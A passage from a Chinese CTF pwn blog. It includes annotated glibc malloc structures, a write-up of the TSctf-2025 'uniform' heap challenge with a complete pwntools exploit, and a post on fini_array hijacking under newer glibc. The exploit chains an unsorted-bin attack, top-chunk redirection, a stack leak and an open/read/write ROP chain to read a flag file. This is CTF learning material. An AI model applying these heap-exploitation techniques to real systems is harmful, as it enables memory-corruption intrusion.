support */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;                    <span class="comment">// 当前mmap映射数量</span></span><br><span class="line">  <span class="type">int</span> n_mmaps_max;                <span class="comment">// 最大mmap映射数</span></span><br><span class="line">  <span class="type">int</span> max_n_mmaps;                <span class="comment">// 历史最大mmap数</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;           <span class="comment">// 是否禁用动态阈值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;    <span class="comment">// mmap分配的总内存</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;<span class="comment">// mmap内存的历史最大值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;                <span class="comment">// sbrk堆的起始地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_bins;             <span class="comment">// tcache bin数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_max_bytes;        <span class="comment">// tcache最大字节数</span></span><br><span class="line">  <span class="type">size_t</span> tcache_count;            <span class="comment">// 每个bin的chunk数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_limit;   <span class="comment">// tcache未排序限制</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,<span class="comment">//未上锁</span></span><br><span class="line">  .next = &amp;main_arena, <span class="comment">//指向自己形成arena链表闭环</span></span><br><span class="line">  .attached_threads = <span class="number">1</span> <span class="comment">//初始只有主线程附在arena上</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is only one instance of the malloc parameters.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p> 这里还有个全局唯一的mp_，作为堆分配的<code>配置策略以及记录arena的统计中心</code></p>
</blockquote>
<p>这里定义main_arena用了C 语言的 <strong>指定初始化器</strong>，具体解释可以见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42258222/article/details/105221108">https://blog.csdn.net/weixin_42258222/article/details/105221108</a></p>
<p>堆管理的结构实际上是malloc_state，而main_arena的定义其实就是初始化了一些malloc_state的成员，具体意义在注释中解释。</p>
<blockquote>
<p>这里解释一下线程附着在arena的意义:</p>
<ul>
<li>线程第一次调用 <code>malloc</code> 时，glibc 会根据线程 ID 做哈希，从环形链表挑一个 arena；</li>
<li>若该 arena 当前<strong>空闲</strong>（<code>attached_threads == 0</code>），就把计数 +1，同时把线程的 <code>tcb-&gt;arena</code> 指针指向它——<strong>此时称线程“附着”到这块 arena</strong>；</li>
<li>线程后续再 malloc&#x2F;free 都<strong>直接复用这块 arena</strong>，无需重新哈希</li>
<li>线程退出或调用 <code>malloc_consolidate</code> 迁移时，计数减 1；减到 0 表示<strong>没有任何线程再用它</strong>，这块 arena 就可以被整个释放或回收进全局缓存。</li>
</ul>
</blockquote>
<p>这里详细解释一下其中的bin数组:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 索引布局：</span></span><br><span class="line">bins[<span class="number">0</span>]                    <span class="comment">// 未使用</span></span><br><span class="line">bins[<span class="number">1</span>] = unsorted_bin.fd  <span class="comment">// unsorted bin 前向指针</span></span><br><span class="line">bins[<span class="number">2</span>] = unsorted_bin.bk  <span class="comment">// unsorted bin 后向指针</span></span><br><span class="line"></span><br><span class="line">bins[<span class="number">3</span>] = smallbin[<span class="number">1</span>].fd   <span class="comment">// size 0x20 的前向指针  </span></span><br><span class="line">bins[<span class="number">4</span>] = smallbin[<span class="number">1</span>].bk   <span class="comment">// size 0x20 的后向指针</span></span><br><span class="line">bins[<span class="number">5</span>] = smallbin[<span class="number">2</span>].fd   <span class="comment">// size 0x30 的前向指针</span></span><br><span class="line">bins[<span class="number">6</span>] = smallbin[<span class="number">2</span>].bk   <span class="comment">// size 0x30 的后向指针</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">bins[<span class="number">125</span>] = smallbin[<span class="number">62</span>].fd <span class="comment">// size 0x3f0 的前向指针</span></span><br><span class="line">bins[<span class="number">126</span>] = smallbin[<span class="number">62</span>].bk <span class="comment">// size 0x3f0 的后向指针</span></span><br><span class="line"></span><br><span class="line">bins[<span class="number">127</span>] = largebin[<span class="number">0</span>].fd  <span class="comment">// large bins 开始...</span></span><br><span class="line"><span class="comment">// 一直到 bins[253]</span></span><br></pre></td></tr></table></figure>

<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><p>管理对应线程的tcache，存储在<strong>堆内存开头</strong>，自身作为一个<strong>chunk</strong>被管理，在<strong>第一次需要时</strong>动态创建，一般是内存中第一个chunk。2.35版本下的源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];<span class="comment">// 每个bin的chunk计数</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];<span class="comment">// 每个bin的首个chunk</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>



<h2 id="利用实战"><a href="#利用实战" class="headerlink" title="利用实战"></a>利用实战</h2><p>TSctf-2025的uniform，题目中给了固定大小的chunk无限次uaf。考虑打unsortedbin attack攻击，攻击buf数组（用来存堆指针的数组）中某一索引，实现对于main_arena中自top成员后0x80大小的控制权。修改top指针可以实现迁移top_chunk而达到任意地址分配，当然这里注意对应位置要符合16位地址对其以及pre_size位为1。这里题目刚好存在一个全局变量在buf数组前面，构造此buf为一个合法且足够分配0x90大小chunk的top_chunk size，然后再通过main_arena修改将top_chunk迁移并修复unsorted_bin，分配就能控制buf数组啦。</p>
<p><img src="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/2.png" alt="main_arena中构造后，使top指向buf"></p>
<blockquote>
<p>构造后的main_arena中top指向buf</p>
</blockquote>
<p><img src="/2025/10/26/%E5%A0%86%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84/1.png" alt="成功将堆分配到buf字段"></p>
<blockquote>
<p>成功将堆分配到buf字段</p>
</blockquote>
<p>通过envirno泄露栈地址并覆盖返回值为rop链即可。</p>
<p>Poc.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gdb&#x27;</span>, <span class="string">&#x27;-p&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;10.21.162.149&#x27;,64649)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">&#x27;description:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">6</span>)<span class="comment">#防止合并</span></span><br><span class="line"><span class="comment">#泄漏libc以及heap地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=leak_libc-<span class="number">0x3c4b78</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">global_max_fast=libc.address+<span class="number">0x3c67f8</span> </span><br><span class="line">pop_rdi=libc.address+<span class="number">0x21112</span></span><br><span class="line">pop_rsi=libc.address+<span class="number">0x202f8</span></span><br><span class="line">pop_rdx_rsi=libc.address+<span class="number">0x1151c9</span></span><br><span class="line">buf=<span class="number">0x602068</span> <span class="comment">#存堆地址</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_heap+<span class="number">0x130</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="comment"># edit(1,p64(leak_heap)+p64(heap_base))</span></span><br><span class="line"><span class="comment"># edit(3,p64(0)+p64(0x61)+p64(heap_base-0x130)+p64(heap_base+0x110))</span></span><br><span class="line"><span class="comment"># edit(5,p64(heap_base))</span></span><br><span class="line"><span class="comment"># add(1)  这里是尝试fsop</span></span><br><span class="line">add(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#接下来开始攻击buf修改top_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(leak_libc)+p64(buf))</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#修复崩溃并且将top_chunk放到buf数组前面，</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;1131796&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;challenge?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0xf1</span>).encode())</span><br><span class="line">p.sendafter(<span class="string">&#x27;are!\n&#x27;</span>,<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(buf-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(leak_libc)*<span class="number">2</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#这次请求会请求到buf数组</span></span><br><span class="line"><span class="comment">#通过全局变量environ泄露栈地址</span></span><br><span class="line">edit(<span class="number">7</span>,p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">stack=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target=stack-<span class="number">0xf0</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(target))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;flag\x00&#x27;</span>)</span><br><span class="line">file_adr=heap_base-<span class="number">0x90</span></span><br><span class="line"><span class="comment">#覆盖栈上的返回地址orw</span></span><br><span class="line">edit(<span class="number">7</span>,p64(target))</span><br><span class="line">orw=flat([</span><br><span class="line">    pop_rdi,file_adr,pop_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,libc.sym[<span class="string">&#x27;open&#x27;</span>],pop_rdi,<span class="number">3</span>,pop_rdx_rsi,<span class="number">0x100</span>,file_adr,libc.sym[<span class="string">&#x27;read&#x27;</span>],pop_rdi,<span class="number">1</span>,libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">])</span><br><span class="line"><span class="comment">#这里吐槽一下远程环境和本地不一样，open时的句柄来到了6，本地是正常的3</span></span><br><span class="line">edit(<span class="number">0</span>,orw)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">高libc版本下fini_array劫持探索</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-23 11:08:57" itemprop="dateCreated datePublished" datetime="2025-10-23T11:08:57+08:00">2025-10-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-29 15:13:26" itemprop="dateModified" datetime="2025-10-29T15:13:26+08:00">2025-10-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>在网上偶然发现一种比较底层的控制程序流方法：<code>__libc_csu_fini劫持</code></p>
<p>利用条件是fini_array为可写状态。利用<code>readelf -S ./pwn | grep .fini_array</code>命令可以查看fini_array位置</p>
<p>然而在我利用本地libc运行demo尝试复现时发现:__libc_start_main函数貌似与题目中不太一样，甚至已经找不到__libc_csu_fini函数了，那么这个利用方法到底能否用于高libc版本的程序呢？我打算一探究竟。</p>
<p>首先过一遍c程序的执行流程:<br> start函数（text段的起点）调用了libc_start_main</p>
<p> 在libc_start_main中调用__libc_start_call_main</p>
<p> __libc_start_call_main调用了main函数</p>
<p> 返回__libc_start_call_main中并调用exit退出。</p>
<h4 id="在GLIBC-3-35下，我发现在exit中-libc-csu-fini函数不见了，而取而代之实现对应功能的是-dl-call-fini函数"><a href="#在GLIBC-3-35下，我发现在exit中-libc-csu-fini函数不见了，而取而代之实现对应功能的是-dl-call-fini函数" class="headerlink" title="在GLIBC 3.35下，我发现在exit中__libc_csu_fini函数不见了，而取而代之实现对应功能的是(_dl)_call_fini函数"></a>在GLIBC 3.35下，我发现在exit中__libc_csu_fini函数不见了，而取而代之实现对应功能的是(_dl)_call_fini函数</h4><blockquote>
<p>梳理一下libc_start_main流程(动态链接)：<br>__libc_start_main<br>├── 安全初始化<br>├── 线程局部存储(TLS)初始化<br>├── 堆栈保护设置<br>├── 动态链接器初始化<br>├── 环境变量设置<br>├── 调用全局构造函数<br>│   ├── <code>_init()</code><br>│   ├── <code>frame_dummy()</code> [异常处理框架]<br>│   └── <code>.init_array</code> 中的所有函数<br>↓<br><code>__libc_start_call_main</code> (GLIBC 2.34+)<br>│   ↓<br>│   main() [用户程序]<br>│   ↓<br>│   exit()<br>│       ├── 最后在<code>_dl_call_fini</code>函数内遍历调用fini_array数组</p>
</blockquote>
<p>注：在静态链接的程序exit()最后调用到call_fini()</p>
<p>这里需要详细解释一下exit的流程：<br>exit(status)<br>    ↓ 调用<br><code>__run_exit_handlers(status, &amp;__exit_funcs, true, true)</code><br>    ↓调用<br>   <code> _dl_fini()</code> 进行动态链接器清理<br>    ↓函数执行过程<br>    ↓遍历linkmap生成模块列表<br>    ↓<code>_dl_sort_maps(_dl_loaded, _dl_nloaded, NULL)</code>  ← 为模块排序<br>    ↓遍历排序后的模块列表<br>    ↓对每个模块调用<code>_dl_call_fini</code><br>    ↓调用<code>_IO_cleanup</code>，其中有著名的<code>_IO_flush_all</code><br>执行 <code>.fini_array </code>和 <code>_fini()</code></p>
<p>这里逆一下<code>_dl_call_fini</code>的源码：<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/1.png"><br>如果在程序执行流中如果有机会通过任意地址写或者数组越界的方式写到fini_array数组的位置，就能实现劫持程序流了？考虑一下题目的两种利用的情景：</p>
<p>1.构造array实现main无限loop</p>
<blockquote>
<p>fini_array[0] &#x3D; __libc_csu_fini<br>fini_array[1] &#x3D; main</p>
</blockquote>
<p>需要注意控制fini_array长度大于2<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/2.png"><br>通过调试发现存储array长度的数据存在elf的.dynamic段<br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/3.png"><br><img src="/2025/10/23/libc-csu-fini%E5%8A%AB%E6%8C%81/4.png"><br>对.dynamic段的具体解释见:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qfanmingyiq/article/details/124527430">https://blog.csdn.net/qfanmingyiq/article/details/124527430</a><br>简单来说.dynamic 段为动态链接器提供了：</p>
<ul>
<li>依赖关系：需要加载哪些共享库</li>
<li>符号解析：如何查找和解析符号</li>
<li>重定位信息：如何修正地址引用</li>
<li>初始化与终结流程：何时调用构造函数与析构函数</li>
<li>版本控制：符号版本兼容性</li>
</ul>
<p>那么fini array的长度和什么东西有关呢。这里先明确一下fini array存在的意义：为了确保资源正确释放<br>那么什么资源需要释放呢？问ai给出了几种：</p>
<table>
<thead>
<tr>
<th>影响因素</th>
<th>对数量的贡献</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>全局 C++ 对象</td>
<td>+N (每个对象)</td>
<td><code>MyClass obj1, obj2;</code></td>
</tr>
<tr>
<td>destructor 属性</td>
<td>+N (每个函数)</td>
<td><code>__attribute__((destructor))</code></td>
</tr>
<tr>
<td>静态库初始化</td>
<td>+M (库决定)</td>
<td>链接的静态库</td>
</tr>
<tr>
<td>编译器生成</td>
<td>+K (编译器决定)</td>
<td>异常处理清理等</td>
</tr>
</tbody></table>
<p>2.构造array实现无限长的ROP链</p>
<blockquote>
<p>fini_array[0] &#x3D; leave_ret<br>fini_array[1] &#x3D; ret<br>fini_array[2]&#x3D;ROP链子</p>
</blockquote>
<p>这个方法利用的前提是在libc_csu_fini中遍历调用fini_array时函数将栈给迁移到了fini_array上，但是在GLIBC3.35以上用的 _dl_call_fini()中栈并没有迁移到这上面，当然也就失效了。</p>
<h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><p>综合看来这种利用方法貌似比较过时了(主要局限在fini_array数组的位置不可写)，不过这次对于libc_start_main函数的探索也受益良多，本人对于底层的原理尚有很多待探索的。感受较深的就是版本的更迭也就意味攻击手法的更新也需跟上，那么对底层原理的熟练掌握以及积极发动主观能动思考能力也就不可或缺，加油！</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/10/22/Learning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/10/22/Learning/" class="post-title-link" itemprop="url">也许很快就会更</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-10-22 10:27:57" itemprop="dateCreated datePublished" datetime="2025-10-22T10:27:57+08:00">2025-10-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-10-29 15:21:30" itemprop="dateModified" datetime="2025-10-29T15:21:30+08:00">2025-10-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p><strong>目前状态</strong>: 鉴于过菜还在努力学习中……..</p>
</blockquote>
<hr>
<h3 id="这个博客将会记录"><a href="#这个博客将会记录" class="headerlink" title="这个博客将会记录:"></a>这个博客将会记录:</h3><ul>
<li><strong>Windows 内核学习过程</strong> </li>
<li>**二进制安全 ** 知识记载</li>
<li><strong>CTF pwn方向 Writeups</strong> </li>
<li>一些心得（也许）</li>
</ul>
<hr>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">no_t1me</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
